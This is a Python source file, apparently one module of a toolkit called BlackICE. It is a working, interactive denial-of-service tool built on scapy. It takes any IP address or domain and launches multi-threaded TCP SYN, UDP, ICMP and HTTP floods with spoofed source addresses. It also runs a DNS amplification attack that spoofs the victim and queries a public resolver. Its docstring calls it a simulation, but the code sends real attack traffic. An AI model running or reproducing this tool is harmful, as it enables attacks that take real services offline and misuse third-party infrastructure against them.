import time
import random
import threading
import socket
from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.http import HTTPRequest
from scapy.layers.l2 import Ether, ARP
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress
from rich import box

class DDOSAttacks:
    """ 
    This is my ddos class for ddos attacks, it uses scapy and simulates a ddos attack 
    """
    description = "Distributed Denial of Service attack simulations"
    
    def __init__(self):
        """ 
        initialize the module
        """
        self.console = Console()
        self.target_ip = None
        self.target_url = None
        self.target_port = None
        self.attack_type = None
        self.thread_count = 10
        self.duration = 30
        self.is_attacking = False
        self.attack_threads = []
        self.packet_count = 0
        
    def run(self):
        """ 
        interactively configure and launch a DDoS attack.
        Gathers user input, confirms selections, and triggers execution.
        """
        try:
            self.console.print(
                Panel.fit(
                    "DDoS Attack Simulator",
                    style="red",
                    title="BlackICE DDoS Module"
                )
            )
                
            config = self._get_attack_config()
            self.target_ip = config['target_ip']
            self.target_url = config['target_url']
            self.target_port = config['target_port']
            self.attack_type = config['attack_type']
            self.thread_count = config['thread_count']
            self.duration = config['duration']
            
            self._show_attack_summary(config)
            
            if not self._confirm_attack():
                return
                
            self._execute_ddos_attack()
            
        except Exception as e:
            self.console.print(
                Panel.fit(
                    f"DDoS attack failed: {e}",
                    style="red",
                    title="Attack Failed"
                )
            )
    
    def _get_attack_config(self):
        """ 
        asks the user for ip or url to launch to ddos attack on
        """
        self.console.print("\nDDoS Attack Configuration")
        
        self.console.print("\nTarget Type:")
        self.console.print("  1. IP Address")
        self.console.print("  2. URL/Domain")
        
        target_type = self.console.input("Select target type (1-2): ").strip()
        
        target_ip = None
        target_url = None
        
        if target_type == "2":
            target_url = self.console.input("Enter target URL (e.g., example.com): ").strip()
            try:
                target_ip = socket.gethostbyname(target_url)
                self.console.print(f"Resolved {target_url} -> {target_ip}")
            except socket.gaierror:
                self.console.print(f"Error: Could not resolve {target_url}")
                return self._get_attack_config()  
        else:
            target_ip = self.console.input("Enter target IP address: ").strip()
            try:
                socket.inet_aton(target_ip)
            except socket.error:
                self.console.print(f"Error: Invalid IP address format")
                return self._get_attack_config()  
        
        target_port = self.console.input("Target port (0 for ICMP/random, 80 for HTTP): ").strip()
        target_port = int(target_port) if target_port else 0
        
        self.console.print("\nAvailable Attack Types:")
        attacks = {
            "1": ("TCP SYN Flood", "syn"),
            "2": ("UDP Flood", "udp"),
            "3": ("ICMP Flood", "icmp"),
            "4": ("HTTP Flood", "http"),
            "5": ("DNS Amplification", "dns"),
            "6": ("Mixed Attack", "mixed")
        }
        
        for key, (name, _) in attacks.items():
            self.console.print(f"  {key}. {name}")
        
        attack_choice = self.console.input("\nSelect attack type (1-6): ").strip()
        attack_type = attacks.get(attack_choice, attacks["1"])[1]
        
        if attack_type == "http" and target_port == 0:
            target_port = 80
            self.console.print(f"Auto-set port to 80 for HTTP attack")
        
        thread_count = self.console.input("Number of threads [10]: ").strip()
        thread_count = int(thread_count) if thread_count else 10
        
        duration = self.console.input("Attack duration (seconds) [30]: ").strip()
        duration = int(duration) if duration else 30
        
        return {
            'target_ip': target_ip,
            'target_url': target_url,
            'target_port': target_port,
            'attack_type': attack_type,
            'thread_count': thread_count,
            'duration': duration
        }
    
    def _show_attack_summary(self, config):
        attack_names = {
            "syn": "TCP SYN Flood",
            "udp": "UDP Flood", 
            "icmp": "ICMP Flood",
            "http": "HTTP Flood",
            "dns": "DNS Amplification",
            "mixed": "Mixed Attack"
        }
        
        table = Table(show_header=True, header_style="bold yellow")
        table.add_column("Parameter", style="cyan")
        table.add_column("Value", style="white")
        
        if config['target_url']:
            table.add_row("Target URL", config['target_url'])
            table.add_row("Resolved IP", config['target_ip'])
        else:
            table.add_row("Target IP", config['target_ip'])
            
        table.add_row("Target Port", str(config['target_port']))
        table.add_row("Attack Type", attack_names[config['attack_type']])
        table.add_row("Threads", str(config['thread_count']))
        table.add_row("Duration", f"{config['duration']} seconds")
        
        self.console.print(
            Panel(
                table,
                title="Attack Summary",
                style="yellow"
            )
        )
    
    def _confirm_attack(self):
        """ 
        double checks if the user wants to launch a ddos atack
        """
        confirm = self.console.input(
            "\nLaunch DDoS attack? (y/N): "
        ).strip().lower()
        return confirm == 'y'
    
    def _execute_ddos_attack(self):
        """ 
        start multi-threaded attack execution and dispatch worker threads. Tracks runtime duration and stops all workers upon timeout
        """
        self.console.print(
            Panel.fit(
                "LAUNCHING DDoS ATTACK",
                style="red",
                title="Attack Initiated"
            )
        )
        
        self.is_attacking = True
        self.packet_count = 0
        start_time = time.time()
        end_time = start_time + self.duration
        
        stats_thread = threading.Thread(target=self._show_statistics, args=(end_time,))
        stats_thread.daemon = True
        stats_thread.start()
        
        for i in range(self.thread_count):
            thread = threading.Thread(target=self._attack_worker, args=(i, end_time))
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
        
        try:
            while time.time() < end_time and self.is_attacking:
                time.sleep(1)
        except KeyboardInterrupt:
            self.console.print("\nAttack interrupted by user")
        
        self._stop_attack()
        
        self._show_final_stats(start_time)
    
    def _attack_worker(self, worker_id, end_time):
        """
        this loop continuously dispatches packets according to the selected attack type while the attack is active
        """
        self.console.print(f"Worker {worker_id} started")
        
        while time.time() < end_time and self.is_attacking:
            try:
                if self.attack_type == "syn":
                    self._send_syn_packet()
                elif self.attack_type == "udp":
                    self._send_udp_packet()
                elif self.attack_type == "icmp":
                    self._send_icmp_packet()
                elif self.attack_type == "http":
                    self._send_http_packet()
                elif self.attack_type == "dns":
                    self._send_dns_packet()
                elif self.attack_type == "mixed":
                    self._send_mixed_packet()
                
                self.packet_count += 1
                
            except Exception as e:
                self.console.print(f"Worker {worker_id} error: {e}")
                time.sleep(0.1)
    
    def _send_syn_packet(self):
        """
        send tcp syn packets to flood
        """
        src_ip = f"10.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)
        
        ip_layer = IP(src=src_ip, dst=self.target_ip)
        tcp_layer = TCP(sport=src_port, dport=self.target_port or 80, flags="S", seq=random.randint(1000, 100000))
        
        send(ip_layer/tcp_layer, verbose=0)
    
    def _send_udp_packet(self):
        """
        send udp packets to flood
        """
        src_ip = f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)
        
        ip_layer = IP(src=src_ip, dst=self.target_ip)
        udp_layer = UDP(sport=src_port, dport=self.target_port or random.randint(1, 65535))
        data = Raw(load="X" * random.randint(64, 1024))
        
        send(ip_layer/udp_layer/data, verbose=0)
    
    def _send_icmp_packet(self):
        """
        send icmp/ping requests to flood
        """
        src_ip = f"172.16.{random.randint(1,254)}.{random.randint(1,254)}"
        
        ip_layer = IP(src=src_ip, dst=self.target_ip)
        icmp_layer = ICMP()
        data = Raw(load="X" * random.randint(32, 512))
        
        send(ip_layer/icmp_layer/data, verbose=0)
    
    def _send_http_packet(self):
        """
        send http packets to flood
        """
        src_ip = f"10.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)
        
        ip_layer = IP(src=src_ip, dst=self.target_ip)
        tcp_layer = TCP(sport=src_port, dport=self.target_port or 80, flags="PA", seq=random.randint(1000, 100000))
        
        host_header = self.target_url if self.target_url else self.target_ip
        
        http_methods = ["GET", "POST", "HEAD"]
        http_paths = ["/", "/index.html", "/api/v1/test", "/admin", "/images/logo.png"]
        
        http_request = (
            f"{random.choice(http_methods)} {random.choice(http_paths)} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            f"Connection: keep-alive\r\n\r\n"
        )
        
        send(ip_layer/tcp_layer/Raw(load=http_request), verbose=0)
    
    def _send_dns_packet(self):
        """
        dns amplification by sending dns queries with spoofed source addresses to misconfigured resolvers, generating amplified responses
        """
        src_ip = self.target_ip
        
        ip_layer = IP(src=src_ip, dst="8.8.8.8")
        udp_layer = UDP(sport=53, dport=53)
        
        domain = self.target_url if self.target_url else "google.com"
        
        dns_query = DNS(
            rd=1,
            qd=DNSQR(qname=domain, qtype="ANY")
        )
        
        send(ip_layer/udp_layer/dns_query, verbose=0)
    
    def _send_mixed_packet(self):
        """
        this is a mixed attack that send random packets using http, udp, tcp syn and ping 
        """
        attacks = [
            self._send_syn_packet,
            self._send_udp_packet, 
            self._send_icmp_packet,
            self._send_http_packet
        ]
        random.choice(attacks)()
    
    def _show_statistics(self, end_time):
        """
        shows real time attack stats
        """
        start_time = time.time()
        last_count = 0
        last_time = start_time
        
        while time.time() < end_time and self.is_attacking:
            current_time = time.time()
            elapsed = current_time - start_time
            remaining = end_time - current_time
            
            current_count = self.packet_count
            pps = (current_count - last_count) / (current_time - last_time) if current_time > last_time else 0
            
            target_display = self.target_url if self.target_url else self.target_ip
            
            self.console.print(
                f"\rTarget: {target_display} | "
                f"Elapsed: {elapsed:.1f}s | "
                f"Remaining: {remaining:.1f}s | "
                f"Packets: {current_count:,} | "
                f"Rate: {pps:,.0f} pps",
                end=""
            )
            
            last_count = current_count
            last_time = current_time
            time.sleep(1)
    
    def _stop_attack(self):
        """
        stop all attack threads
        """
        self.is_attacking = False
        
        for thread in self.attack_threads:
            thread.join(timeout=2)
        
        self.attack_threads.clear()
    
    def _show_final_stats(self, start_time):
        """
        shows the final attack statistics
        """
        total_time = time.time() - start_time
        pps = self.packet_count / total_time if total_time > 0 else 0
        
        table = Table(show_header=True, header_style="bold green")
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="white")
        
        if self.target_url:
            table.add_row("Target URL", self.target_url)
            table.add_row("Target IP", self.target_ip)
        else:
            table.add_row("Target IP", self.target_ip)
            
        table.add_row("Total Duration", f"{total_time:.2f} seconds")
        table.add_row("Total Packets Sent", f"{self.packet_count:,}")
        table.add_row("Average Packets/Second", f"{pps:,.0f}")
        table.add_row("Attack Type", self.attack_type.upper())
        table.add_row("Threads Used", str(self.thread_count))
        
        self.console.print("\n")
        self.console.print(
            Panel(
                table,
                title="Attack Complete - Final Statistics",
                style="green"
            )
        )
